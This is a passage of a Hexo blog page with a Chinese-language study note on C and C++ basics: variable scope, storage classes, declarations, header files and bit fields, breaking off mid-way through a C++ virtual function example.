<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/" class="post-title-link" itemprop="url">C&Cpp杂谈（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-03 14:10:19 / Modified: 14:51:55" itemprop="dateCreated datePublished" datetime="2022-06-03T14:10:19+08:00">2022-06-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="C语言-作用域"><a href="#C语言-作用域" class="headerlink" title="C语言-作用域"></a>C语言-作用域</h2><p><strong>作用域简析</strong></p>
<p>所谓作用域，就是变量的有效范围，即变量可以在哪个范围以内使用</p>
<p>​        // 有些变量可以在所有代码文件中使用，有些变量只能在当前的文件中使用，有些变量只能在函数内部使用，有些变量只能在 for 循环内部使用</p>
<p>变量的作用域由变量的定义位置决定，在不同位置定义的变量，它的作用域是不一样的 </p>
<p>C语言编译器可以确认四种不同类型的作用域：</p>
<ul>
<li>代码块作用域（代码块是{}之间的一段代码）</li>
<li>文件作用域</li>
<li>原型作用域</li>
<li>函数作用域（局部变量）</li>
</ul>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35712811/article/details/117015194">C语言总结之变量的种类</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiangsikai/p/12378680.html">C语言 作用域</a> </p>
<p><strong>常见的代码块作用域</strong></p>
<p>一，如：“if(){}”，“while(){}”，“switch(){ case 1:{}……}”等各种情况的{}即块作用作用域，在{}中定义的变量，作用域仅限定在{}中</p>
<p>换句话说，在代码块内部定义的变量只能在代码块内部使用，出了代码块就无效了 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;  <span class="comment">//也可以写作 int gcd(int, int);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The greatest common divisor is %d\n&quot;</span>, gcd(<span class="number">100</span>, <span class="number">60</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="comment">//若a&lt;b，那么交换两变量的值</span></span><br><span class="line">    <span class="keyword">if</span>(a &lt; b)&#123;</span><br><span class="line">        <span class="keyword">int</span> temp1 = a;  <span class="comment">//块级变量</span></span><br><span class="line">        a = b;</span><br><span class="line">        b = temp1;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//求最大公约数</span></span><br><span class="line">    <span class="keyword">while</span>(b!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> temp2 = b;  <span class="comment">//块级变量</span></span><br><span class="line">        b = a % b;</span><br><span class="line">        a = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>“temp1”的作用域是 if 内部，“temp2”的作用域是 while 内部 </p>
<p>二，for循环中定义的变量，作用作用域仅限于for循环</p>
<p>三，单独的代码块也可以成立</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">22</span>;  <span class="comment">//编号①</span></span><br><span class="line">    <span class="comment">//由&#123; &#125;包围的代码块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">40</span>;  <span class="comment">//编号②</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有两个 n，它们位于不同的作用域，不会产生命名冲突</p>
<p>​        // { } 的作用域比 main() 更小</p>
<p>参考： <a target="_blank" rel="noopener" href="http://c.biancheng.net/view/1860.html">C语言块级变量：在代码块内部定义的变量 </a> </p>
<p><strong>文件作用域简析</strong></p>
<p>简单来说，就是在函数外声明的作用域，其名称从声明的地方开始，到该程序的结尾都是通用的 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER 5   <span class="comment">// 对象式宏</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v[NUMBER];    <span class="comment">// 在函数外声明的变量，文件作用域，定义声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">void</span>)</span></span>;   <span class="comment">// 因为func1函数是在main函数之后创建的，因此需要函数原型声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> v[];   <span class="comment">// 非定义声明，可省略</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input the scores.&quot;</span>); </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;v[%d] = &quot;</span>, i); <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the max : %d\n&quot;</span>, func1());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> v[];   ## 非定义声明，可省略</span><br><span class="line">    <span class="keyword">int</span> i, max = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v[i] &gt; max)</span><br><span class="line">            max = v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从“int func1(void)”开始到文件结束，都是“func1”的文本作用域，所以要在“main”前写入“int func1(void)；”，使其在作用域中</p>
<p>​        // 函数定义的“int func1(void)”也有声明的功效，为 <strong>定义声明</strong> ，而其他的都是 <strong>引用声明</strong>     </p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liujiaxin2018/p/14594723.html">C语言中的文件作用域、函数原型声明、定义声明和非定义声明</a></p>
<p><strong>原型作用域简析</strong></p>
<p>函数原型作用域只对于函数原型声明的形式参数有意义（其它变量声明之类都在块作用域）</p>
<p>其作用域始于“(”，结束于“)” </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Area</span><span class="params">(<span class="keyword">double</span> radius)</span></span>; <span class="comment">// radius 就只有在括号中才有效</span></span><br><span class="line"><span class="comment">// 如果后面没有跟“ ; ”，而是跟了“ &#123;&#125; ”，那么就不是函数声明，而是函数定义了，radius在后续的代码块中也可以发挥作用</span></span><br></pre></td></tr></table></figure>
<p>函数原型： 即函数声明，给出了函数名、返回值类型、参数列表（重点是参数类型）等与该函数有关的信息</p>
<p><strong>作用域的层级关系</strong></p>
<p>每个C语言程序都包含了多个作用域，不同的作用域中可以出现同名的变量，C语言会按照<strong>从小到大</strong>的顺序，一层一层地去父级作用域中查找变量，如果在最顶层的全局作用域中还未找到这个变量，那么就会报错 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> m = <span class="number">13</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">20</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">822</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block1 n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func1 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;if m: %d\n&quot;</span>, m);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> n = i % <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;<span class="number">2</span> &amp;&amp; n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;else m: %d\n&quot;</span>, m);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func2 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func3 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">30</span>;</span><br><span class="line">    func1();</span><br><span class="line">    func2(n);</span><br><span class="line">    func3();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1645103488630-1645590344944-1654239107513.png" class width="1645103488630"> 
<h2 id="C语言-存储类说明符"><a href="#C语言-存储类说明符" class="headerlink" title="C语言-存储类说明符"></a>C语言-存储类说明符</h2><p>C语言的存储类说明符有以下几个：</p>
<ul>
<li>Auto：只在 <strong>块内</strong> 变量声明中被允许, 表示变量具有本地生存期</li>
<li>Extern：出现在 <strong>顶层</strong> 或 <strong>块的外部</strong> 的变量函数与变量声明中，表示声明的对象具有静态生存期, 连接程序知道其名字</li>
<li>Static：可以放在 <strong>函数与变量声明中</strong> ，在函数定义时，只用于指定函数名，而不将函数导出到链接程序，在函数声明中，表示其后边会有定义声明的函数，存储类型static，在数据声明中，总是表示定义的声明不导出到连接程序 </li>
</ul>
<p>C99中规定：所有顶层的默认存储类标志符都是extern</p>
<p>在C语言中一个人为的规范：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在.h文件中声明的函数，如果在其对应的.c文件中有定义，那么我们在声明这个函数时，不使用<span class="keyword">extern</span>修饰符，反之，则必须显示使用<span class="keyword">extern</span>修饰符</span><br></pre></td></tr></table></figure>
<h2 id="C语言-定义声明-amp-引用声明"><a href="#C语言-定义声明-amp-引用声明" class="headerlink" title="C语言-定义声明&amp;引用声明"></a>C语言-定义声明&amp;引用声明</h2><p>定义声明：在声明后，立即进行定义或初始化（如：“ fun( int a ){ } ”，“ int a = 1 ”）</p>
<p>引用声明：其他的声明都是引用声明</p>
<p>​        // 这个只是“初始化语句模型”中的定义方式（为了方便理解）</p>
<p>为了区分定义声明和引用声明，C语言定义了几种模型：</p>
<ul>
<li>初始化语句模型：顶层声明中，如果存在初始化语句，表示这个声明是定义声明，其他声明是引用声明</li>
<li>省略存储类型模型：所有引用声明要显示的包括存储类extern，而唯一的那个定义声明中，省略存储类说明符</li>
</ul>
<p>在声明定义时，定义数组如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> G_glob[<span class="number">100</span>];</span><br></pre></td></tr></table></figure>
<p>在另一个文件中引用声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * G_glob;</span><br></pre></td></tr></table></figure>
<h2 id="C语言-“-h”-文件的作用"><a href="#C语言-“-h”-文件的作用" class="headerlink" title="C语言 -“.h” 文件的作用"></a>C语言 -“.h” 文件的作用</h2><p>在一个C语言程序中有千千万万个函数（例如：“printf”，“read”……），为了它们的正常使用（文件作用域可以包含其“作用点”），需要事先写明函数声明</p>
<p>这些函数声明并没有写入“.c”文件中，而是写入了“.h”文件中</p>
<p>另外，全局变量也可以写在“.h”文件中，不同的“.h”文件可以写入相同名称的全局变量</p>
<p>参考： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3c7edc778792">C语言中的.h文件的作用</a> </p>
<h2 id="C语言-位域"><a href="#C语言-位域" class="headerlink" title="C语言-位域"></a>C语言-位域</h2><p>有些信息在存储时，并不需要占用一个完整的字节，而只需占几个或一个二进制位</p>
<p>所谓 <strong>“位域”</strong> 是把一个字节中的二进位划分为几个不同的区域，并说明每个区域的位数 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">8</span>; </span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">2</span>; </span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">6</span>; </span><br><span class="line">    <span class="comment">// 位域名:位域长度</span></span><br><span class="line">&#125;data; </span><br></pre></td></tr></table></figure>
<p>说明data为bs变量，a占8位，b占2位，c占6位，共占两个字节（这里假定int类型长度为16位，2字节，通常int都是32位，4字节）</p>
<p>1.一个位域必须存储在同一个单元中，不能跨两个单元，如一个单元所剩空间不够存放另一位域时，应从下一单元起存放该位域</p>
<p>2.可以人为控制“启用&amp;关闭”位域</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">as</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> a:<span class="number">4</span> </span><br><span class="line">    <span class="keyword">unsigned</span> :<span class="number">0</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> b:<span class="number">4</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> c:<span class="number">4</span> </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// a占第一字节的4位，后4位填0表示不使用</span></span><br></pre></td></tr></table></figure>
<p>3.位域可以无位域名，这时它只用来作填充或调整位置 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">1</span> </span><br><span class="line">    <span class="keyword">int</span> :<span class="number">2</span>  </span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">3</span> </span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">2</span> </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<h2 id="Cpp-多态-amp-虚函数"><a href="#Cpp-多态-amp-虚函数" class="headerlink" title="Cpp-多态&amp;虚函数"></a>Cpp-多态&amp;虚函数</h2><p>虚函数对于多态具有决定性的作用，有虚函数才能构成多态 </p>
<p>先看一下案例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> width,height;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Shape</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>)&#123;</span><br><span class="line">        width = a;</span><br><span class="line">        height = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bar fun width:%d\n&quot;</span>,width);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Rectangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">     